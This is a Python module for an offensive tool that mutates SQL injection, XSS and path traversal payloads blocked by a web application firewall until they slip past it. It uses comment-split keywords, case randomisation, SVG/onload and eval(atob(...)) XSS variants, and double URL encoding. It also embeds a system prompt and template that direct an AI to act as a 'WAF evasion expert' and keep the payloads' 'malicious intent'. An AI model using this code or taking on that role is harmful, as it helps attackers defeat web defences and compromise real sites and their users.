"""
Adaptive Learner Module
Learns from blocked payloads and generates improved variants.

This is the core innovation from the research - using AI to adapt payloads
based on WAF responses and detection patterns.

Based on research: "How I Made ChatGPT My Personal Hacking Assistant and Broke Their AI-Powered Security"
by esakkiammal-v (https://infosecwriteups.com/)

System Prompt for AI Assistant:
"You are a WAF evasion expert specializing in AI security systems. Analyze detection 
patterns and create improved payloads."

Temperature: 0.8 (for creative but focused adaptations)
Max Tokens: 800
"""

from typing import Dict, Any, List, Optional
import re
import json


class AdaptiveLearner:
    """
    Adapts and improves payloads based on WAF blocking behavior.
    
    This module analyzes why payloads were blocked and generates improved
    versions that avoid detected patterns while maintaining attack intent.
    """
    
    def __init__(self):
        self.learning_history = []
        self.successful_adaptations = []
        self.common_blocks = self._load_common_blocks()
        self.adaptation_prompt_template = self._load_adaptation_prompt()
    
    def _load_common_blocks(self) -> Dict[str, List[str]]:
        """Load common blocking patterns and their evasion techniques."""
        return {
            "single_quotes": {
                "indicators": ["'", "''"],
                "evasions": [
                    "Use double quotes instead",
                    "Use CHAR() function",
                    "Use hex encoding",
                    "Use comments to break pattern"
                ]
            },
            "union_keyword": {
                "indicators": ["UNION", "union"],
                "evasions": [
                    "Use /**/ between U and NION",
                    "Use mixed case: UnIoN",
                    "Use newlines/tabs: UN\\nION",
                    "Use alternative syntax"
                ]
            },
            "script_tags": {
                "indicators": ["<script>", "</script>"],
                "evasions": [
                    "Use SVG tags with onload",
                    "Use event handlers (onerror, onload)",
                    "Use CSS expressions",
                    "Use JavaScript: protocol"
                ]
            },
            "path_traversal": {
                "indicators": ["../", "..\\"],
                "evasions": [
                    "Use URL encoding: ..%2f",
                    "Use double encoding: ..%252f",
                    "Use Unicode: ..\\u002f",
                    "Use alternative paths with wildcards"
                ]
            },
            "command_separators": {
                "indicators": [";", "|", "&&", "||"],
                "evasions": [
                    "Use line feeds: %0a",
                    "Use backticks instead",
                    "Use $() for subshells",
                    "Chain with whitespace tricks"
                ]
            }
        }
    
    def _load_adaptation_prompt(self) -> str:
        """
        Load the AI adaptation prompt template from the original research.
        This prompt guides the AI assistant in analyzing blocks and generating improvements.
        """
        return """
        The AI WAF blocked this payload: {original_payload}
        Context: {blocked_response}
        
        Analyze why it was detected and create improved versions that:
        1. Maintain the same malicious intent
        2. Use different obfuscation techniques
        3. Avoid the detected patterns
        4. Blend with normal application traffic
        5. Exploit potential gaps in semantic analysis
        
        Provide {count} alternative payloads with explanations of the evasion technique used.
        
        Consider these evasion strategies:
        - Encoding variations (URL, Unicode, hex, base64)
        - Comment insertion to break patterns
        - Case manipulation
        - Whitespace and newline tricks
        - Alternative syntax that achieves same goal
        - Context-appropriate disguises
        
        For each improved payload, explain:
        - What pattern was detected in the original
        - How the new payload avoids detection
        - What technique is being used
        - Confidence level (0.0-1.0) for bypass success
        """
    
    def get_adaptation_prompt(
        self,
        payload: str,
        waf_response: str,
        attack_type: str,
        count: int = 3
    ) -> str:
        """
        Get the formatted adaptation prompt for AI assistant.
        This allows the AI to generate improved payloads based on the research methodology.
        """
        return self.adaptation_prompt_template.format(
            original_payload=payload,
            blocked_response=waf_response,
            count=count
        )
    
    def adapt_payload(
        self,
        payload: str,
        waf_response: str,
        attack_type: str,
        block_reason: str = "",
        count: int = 3
    ) -> Dict[str, Any]:
        """
        Adapt a blocked payload to bypass WAF detection.
        
        This method analyzes the blocking pattern and generates improved variants
        using different evasion techniques.
        
        Args:
            payload: The original blocked payload
            waf_response: Response from WAF (headers, status, body)
            attack_type: Type of attack
            block_reason: Optional explanation of block
            count: Number of improved variants to generate
        
        Returns:
            Dictionary with analysis and improved payloads
        """
        
        # Analyze why it was blocked
        analysis = self._analyze_block_reason(payload, waf_response, attack_type)
        
        # Generate improved variants
        improved_payloads = []
        
        # Strategy 1: Encoding-based evasion
        if "pattern_detection" in analysis["likely_causes"]:
            improved_payloads.extend(
                self._generate_encoding_variants(payload, attack_type, count=1)
            )
        
        # Strategy 2: Keyword obfuscation
        if "keyword_blocking" in analysis["likely_causes"]:
            improved_payloads.extend(
                self._generate_keyword_obfuscation(payload, attack_type, count=1)
            )
        
        # Strategy 3: Structure changes
        if "structure_detection" in analysis["likely_causes"]:
            improved_payloads.extend(
                self._generate_structure_variants(payload, attack_type, count=1)
            )
        
        # Strategy 4: Context switching
        improved_payloads.extend(
            self._generate_context_variants(payload, attack_type, count=count)
        )
        
        # Remove duplicates and limit count
        unique_payloads = []
        seen = set()
        for p in improved_payloads:
            if p["payload"] not in seen:
                seen.add(p["payload"])
                unique_payloads.append(p)
        
        result = {
            "original_payload": payload,
            "analysis": analysis,
            "improved_payloads": unique_payloads[:count],
            "confidence": self._calculate_confidence(analysis),
            "evasion_techniques": list(set([p["technique"] for p in unique_payloads[:count]]))
        }
        
        # Store for learning
        self.learning_history.append({
            "payload": payload,
            "analysis": analysis,
            "improvements": unique_payloads[:count]
        })
        
        return result
    
    def _analyze_block_reason(
        self,
        payload: str,
        waf_response: str,
        attack_type: str
    ) -> Dict[str, Any]:
        """Analyze why a payload was blocked."""
        
        analysis = {
            "blocked_keywords": [],
            "blocked_patterns": [],
            "likely_causes": [],
            "detection_method": "unknown"
        }
        
        payload_lower = payload.lower()
        
        # Check for common blocked keywords
        sql_keywords = ["union", "select", "insert", "delete", "update", "drop", "exec"]
        xss_keywords = ["script", "onerror", "onload", "javascript", "alert"]
        
        if attack_type == "sql_injection":
            for keyword in sql_keywords:
                if keyword in payload_lower:
                    analysis["blocked_keywords"].append(keyword)
        elif attack_type == "xss":
            for keyword in xss_keywords:
                if keyword in payload_lower:
                    analysis["blocked_keywords"].append(keyword)
        
        # Check for pattern-based blocks
        if "'" in payload or '"' in payload:
            analysis["blocked_patterns"].append("quotes")
            analysis["likely_causes"].append("pattern_detection")
        
        if re.search(r'<[^>]+>', payload):
            analysis["blocked_patterns"].append("html_tags")
            analysis["likely_causes"].append("pattern_detection")
        
        if ".." in payload:
            analysis["blocked_patterns"].append("path_traversal")
            analysis["likely_causes"].append("pattern_detection")
        
        if analysis["blocked_keywords"]:
            analysis["likely_causes"].append("keyword_blocking")
            analysis["detection_method"] = "keyword_filter"
        
        if len(analysis["blocked_patterns"]) > 2:
            analysis["likely_causes"].append("structure_detection")
            analysis["detection_method"] = "structural_analysis"
        
        # Analyze WAF response
        if "403" in str(waf_response):
            analysis["waf_behavior"] = "hard_block"
        elif "406" in str(waf_response):
            analysis["waf_behavior"] = "not_acceptable"
        
        return analysis
    
    def _generate_encoding_variants(
        self,
        payload: str,
        attack_type: str,
        count: int = 1
    ) -> List[Dict[str, Any]]:
        """Generate encoding-based evasion variants."""
        
        variants = []
        
        if attack_type == "sql_injection":
            # URL encode special characters
            encoded = payload.replace("'", "%27").replace(" ", "/**/").replace("=", "%3d")
            variants.append({
                "payload": encoded,
                "explanation": "URL encoded quotes and spaces replaced with SQL comments",
                "technique": "encoding_evasion",
                "confidence": "medium"
            })
        
        elif attack_type == "xss":
            # Use HTML entities and encoding
            encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
            # Then use alternative: hex encoding
            hex_encoded = payload.replace("<", "\\x3c").replace(">", "\\x3e")
            variants.append({
                "payload": hex_encoded,
                "explanation": "Hexadecimal encoding for angle brackets",
                "technique": "hex_encoding",
                "confidence": "medium"
            })
        
        elif attack_type == "path_traversal":
            # Double URL encode
            double_encoded = payload.replace("../", "..%252f")
            variants.append({
                "payload": double_encoded,
                "explanation": "Double URL encoding - %2f encoded again as %252f",
                "technique": "double_encoding",
                "confidence": "high"
            })
        
        return variants[:count]
    
    def _generate_keyword_obfuscation(
        self,
        payload: str,
        attack_type: str,
        count: int = 1
    ) -> List[Dict[str, Any]]:
        """Generate keyword obfuscation variants."""
        
        variants = []
        
        if attack_type == "sql_injection":
            # Add comments between keywords
            obfuscated = payload.replace("UNION", "UN/**/ION")
            obfuscated = obfuscated.replace("SELECT", "SEL/**/ECT")
            obfuscated = obfuscated.replace("union", "un/**/ion")
            obfuscated = obfuscated.replace("select", "sel/**/ect")
            
            variants.append({
                "payload": obfuscated,
                "explanation": "SQL comments inserted to break keyword detection",
                "technique": "comment_obfuscation",
                "confidence": "high"
            })
            
            # Case variation
            case_varied = self._randomize_case(payload)
            variants.append({
                "payload": case_varied,
                "explanation": "Randomized case to evade case-sensitive filters",
                "technique": "case_variation",
                "confidence": "medium"
            })
        
        elif attack_type == "xss":
            # Alternative event handlers
            if "onerror" in payload.lower():
                alt = payload.replace("onerror", "onload").replace("onError", "onLoad")
                variants.append({
                    "payload": alt,
                    "explanation": "Alternative event handler (onload instead of onerror)",
                    "technique": "handler_substitution",
                    "confidence": "medium"
                })
            
            # Use SVG instead of script
            if "<script>" in payload.lower():
                svg_variant = payload.replace("<script>", "<svg/onload=").replace("</script>", ">")
                variants.append({
                    "payload": svg_variant,
                    "explanation": "SVG tag with onload event instead of script tags",
                    "technique": "tag_substitution",
                    "confidence": "high"
                })
        
        return variants[:count]
    
    def _generate_structure_variants(
        self,
        payload: str,
        attack_type: str,
        count: int = 1
    ) -> List[Dict[str, Any]]:
        """Generate structurally different variants."""
        
        variants = []
        
        if attack_type == "sql_injection":
            # Add whitespace and comments
            restructured = f"' /* Legitimate query */ {payload.strip()} /* End */"
            variants.append({
                "payload": restructured,
                "explanation": "Wrapped in legitimate-looking comments to change structure",
                "technique": "structural_camouflage",
                "confidence": "medium"
            })
        
        elif attack_type == "xss":
            # Fragment payload across attributes
            if "alert" in payload.lower():
                fragmented = '<img src="x" alt="test" onerror="eval(atob(\'YWxlcnQoMSk=\'))">'
                variants.append({
                    "payload": fragmented,
                    "explanation": "Base64 encoded alert() to change payload structure",
                    "technique": "structural_encoding",
                    "confidence": "high"
                })
        
        return variants[:count]
    
    def _generate_context_variants(
        self,
        payload: str,
        attack_type: str,
        count: int = 2
    ) -> List[Dict[str, Any]]:
        """Generate context-switching variants."""
        
        variants = []
        
        if attack_type == "sql_injection":
            variants.extend([
                {
                    "payload": f"' OR 'x'='x' {payload}",
                    "explanation": "Added benign-looking OR condition before payload",
                    "technique": "prefix_camouflage",
                    "confidence": "medium"
                },
                {
                    "payload": f"{payload} -- Comment explaining database operation",
                    "explanation": "Added legitimate-looking comment suffix",
                    "technique": "suffix_camouflage",
                    "confidence": "medium"
                }
            ])
        
        elif attack_type == "xss":
            variants.extend([
                {
                    "payload": f'<div style="display:none">{payload}</div>',
                    "explanation": "Wrapped in hidden div to change context",
                    "technique": "container_wrapping",
                    "confidence": "low"
                },
                {
                    "payload": payload.replace("alert", "window['al'+'ert']"),
                    "explanation": "String concatenation to avoid keyword detection",
                    "technique": "string_concatenation",
                    "confidence": "high"
                }
            ])
        
        elif attack_type == "path_traversal":
            variants.extend([
                {
                    "payload": payload.replace("../", ".././"),
                    "explanation": "Added extra path components",
                    "technique": "path_padding",
                    "confidence": "medium"
                },
                {
                    "payload": f"{payload}#anchor",
                    "explanation": "Added URL fragment to confuse parsers",
                    "technique": "fragment_addition",
                    "confidence": "low"
                }
            ])
        
        return variants[:count]
    
    def _randomize_case(self, text: str) -> str:
        """Randomize case of alphabetic characters."""
        import random
        result = []
        for char in text:
            if char.isalpha():
                result.append(char.upper() if random.random() > 0.5 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _calculate_confidence(self, analysis: Dict[str, Any]) -> str:
        """Calculate confidence in bypass success."""
        
        if analysis["detection_method"] == "keyword_filter":
            return "high"  # Easier to bypass
        elif analysis["detection_method"] == "structural_analysis":
            return "medium"  # More sophisticated
        elif len(analysis["likely_causes"]) > 2:
            return "low"  # Multiple detection methods
        else:
            return "medium"
    
    def get_learning_insights(self) -> Dict[str, Any]:
        """Get insights from learning history."""
        
        if not self.learning_history:
            return {"message": "No learning history yet"}
        
        insights = {
            "total_adaptations": len(self.learning_history),
            "common_blocks": {},
            "effective_techniques": {},
            "recommendations": []
        }
        
        # Analyze common blocking patterns
        for entry in self.learning_history:
            for cause in entry["analysis"]["likely_causes"]:
                insights["common_blocks"][cause] = insights["common_blocks"].get(cause, 0) + 1
        
        # Most common blocks
        if insights["common_blocks"]:
            most_common = max(insights["common_blocks"], key=insights["common_blocks"].get)
            insights["recommendations"].append(
                f"Most common block: {most_common}. Focus on techniques to evade this."
            )
        
        return insights
